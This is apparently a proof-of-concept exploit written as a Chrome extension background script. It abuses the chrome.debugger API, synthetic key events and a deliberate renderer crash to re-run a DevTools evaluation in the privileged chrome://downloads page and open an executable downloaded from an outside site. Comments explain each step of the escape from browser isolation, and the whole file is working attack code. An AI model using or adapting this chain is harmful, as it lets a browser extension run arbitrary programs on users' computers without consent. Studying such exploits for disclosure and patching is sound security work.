const downloadUrl = "https://live.sysinternals.com/procexp.exe";

let tabUpdatedListener = null;


let debugEventListener = null;

chrome.debugger.onEvent.addListener(function (source, method, params) {
    if (debugEventListener) {
        debugEventListener(source, method, params);
    }
});

let runtimeMessageListener = null;

chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
    if (runtimeMessageListener) {
        runtimeMessageListener(message, sender, sendResponse);
    }
});

startProcess();

function startProcess() {
    chrome.tabs.create({url: downloadUrl});

    // It doesn't matter whether the download has completed by the time findAndRunDownload is
    // called. If that function is called before the download completes, the file will simply be
    // opened once the download has completed.
    setTimeout(() => {
        onDownloadStarted();
    }, 1000);
}

function onDownloadStarted() {
    // chrome.devtools.inspectedWindow.eval is ultimately implemented via a call to
    // Runtime.evaluate:
    //
    // https://source.chromium.org/chromium/chromium/src/+/master:third_party/devtools-frontend/src/front_end/sdk/RuntimeModel.js;l=809;drc=5763061db100575136897bd21945c05eb08c6881
    //
    // When the target page crashes during the Runtime.evaluate call, the call
    // will be re-run after the page has been loaded again.
    // chrome.devtools.inspectedWindow.eval calls Runtime.evaluate with a specific context ID:
    //
    // https://source.chromium.org/chromium/chromium/src/+/master:third_party/devtools-frontend/src/front_end/sdk/RuntimeModel.js;l=814;drc=5763061db100575136897bd21945c05eb08c6881
    //
    // Therefore, it's important that the page loaded before the crash and the page loaded after the
    // crash have the same context ID.
    // Context IDs start at 1 and are assigned sequentially within a particular renderer process:
    //
    // https://source.chromium.org/chromium/chromium/src/+/master:v8/src/inspector/v8-inspector-impl.cc;l=194;drc=7afd12e0d8d0061dd9cdf5bf75a5474078dfd18c
    //
    // That means if there's an existing renderer process for https://example.com/ or
    // chrome://downloads/, the context IDs could be different, which would cause the re-run
    // Runtime.evaluate call to fail.
    // Closing any existing tabs is an attempt to ensure that https://example.com/ and
    // chrome://downloads/ are both loaded in new processes, which means that the context ID for
    // both pages will be 1.
    // An about:blank page can be hosted in an unlocked process (which can then be locked to a
    // particular site), which is why those tabs are closed as well.
    chrome.tabs.query({url: ["https://example.com/", "about:blank", "chrome://downloads/"]}, function (tabs) {
        let tabIds = tabs.map(tab => tab.id);
        chrome.tabs.remove(tabIds, function () {
            onExistingTabsClosed();
        });
    });
}

function onExistingTabsClosed() {
    let targetTab = null;

    chrome.tabs.create({url: "https://example.com/"}, function (tab) {
        targetTab = tab;
    });

    tabUpdatedListener = function (tabId, changeInfo, updatedTab) {
        if (targetTab
            && tabId === targetTab.id
            && changeInfo.status === "complete") {
            tabUpdatedListener = null;

            onTargetTabLoaded(targetTab);
        }
    };
}

function onTargetTabLoaded(tab) {
    chrome.debugger.attach({tabId: tab.id}, "1.3", function () {
        onDebuggerAttachedToTargetTab(tab);
    });
}

function onDebuggerAttachedToTargetTab(tab) {
    // This will open the devtools. Note that in order for the browser to process this key event,
    // the event type needs to be rawKeyDown and nativeVirtualKeyCode needs to be set.
    chrome.debugger.sendCommand({tabId: tab.id}, "Input.dispatchKeyEvent",
        {type: "rawKeyDown", key: "F12", windowsVirtualKeyCode: 123, nativeVirtualKeyCode: 123});

    runtimeMessageListener = function (message, sender, sendResponse) {
        if (message == "devtools-page-loaded") {
            runtimeMessageListener = null;

            onDevtoolsPageLoaded(tab);
        }
    };
}

function onDevtoolsPageLoaded(tab) {
    // Since includeCommandLineAPI is set, this will result in the command line API ArrayBuffer
    // being set up:
    //
    // https://source.chromium.org/chromium/chromium/src/+/master:v8/src/inspector/v8-console.cc;l=692;drc=a25dce8a05437a370eec2e464bea16e9fc9b1404
    chrome.debugger.sendCommand({tabId: tab.id}, "Runtime.evaluate",
        {
            expression: "window.devtoolsCrashEx = {}; window.devtoolsCrashEx.stashedQueryObjects = queryObjects;",
            includeCommandLineAPI: true
        }, function (result) {
            onCommandLineAPIBufferCreated(tab);
        });
}

function onCommandLineAPIBufferCreated(tab) {
    chrome.debugger.sendCommand({tabId: tab.id}, "Runtime.evaluate",
        {
            expression: "ArrayBuffer.prototype"
        }, function (result) {
            onArrayBufferObjectIdDetermined(tab, result.result.objectId);
        });
}

function onArrayBufferObjectIdDetermined(tab, arrayBufferObjectId) {
    // This will return the command line API ArrayBuffer that was set up above.
    chrome.debugger.sendCommand({tabId: tab.id}, "Runtime.queryObjects",
        {
            prototypeObjectId: arrayBufferObjectId
        }, function (result) {
            onQueryObjectsResultReturned(tab, result.objects.objectId);
        });
}

function onQueryObjectsResultReturned(tab, queryObjectsResultId) {
    chrome.debugger.sendCommand({tabId: tab.id}, "Runtime.callFunctionOn",
        {
            functionDeclaration: "function () {window.devtoolsCrashEx.queryObjectsResult = this;}",
            objectId: queryObjectsResultId
        },
        function (result) {
            onQueryObjectsResultSaved(tab);
        });   
}

function onQueryObjectsResultSaved(tab) {
    // Opening a download requires a recent user gesture within the tab. Although there is an F12
    // event dispatched above, relying on that would make the process unreliable. The user gesture
    // timeout is 5 seconds. Therefore, if the time between the F12 keypress above and the opening
    // of the download is more than 5 seconds, the opening will fail.
    // Dispatching a dedicated input event here helps to ensure that there will still be an active
    // user gesture when the download is opened.
    chrome.debugger.sendCommand({tabId: tab.id}, "Input.dispatchKeyEvent",
        {type: "rawKeyDown", key: "ArrowDown", windowsVirtualKeyCode: 40, nativeVirtualKeyCode: 40});

    setTimeout(() => {
        onDispatchedInputToPage(tab);
    }, 1000);
}

function onDispatchedInputToPage(tab) {
    chrome.runtime.sendMessage(undefined, "query-objects-results-saved");

    debugEventListener = function (source, method, params) {
        if (method === "Inspector.targetCrashed") {
            debugEventListener = null;

            chrome.tabs.update(tab.id, {url: "chrome://downloads/"});
        }
    };
}